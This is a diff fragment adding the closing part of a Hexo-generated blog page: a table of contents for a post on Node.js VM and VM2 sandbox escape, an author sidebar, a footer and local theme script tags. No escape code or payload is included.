+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%B2%99%E7%AE%B1"><span class="nav-number">1.</span> <span class="nav-text">什么是沙箱</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VM%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">VM模块的作用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E9%80%83%E9%80%B8"><span class="nav-number">3.</span> <span class="nav-text">如何逃逸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VM2%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8"><span class="nav-number">4.</span> <span class="nav-text">VM2沙盒逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B1"><span class="nav-number">4.1.</span> <span class="nav-text">实例1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B2"><span class="nav-number">5.</span> <span class="nav-text">实例2</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
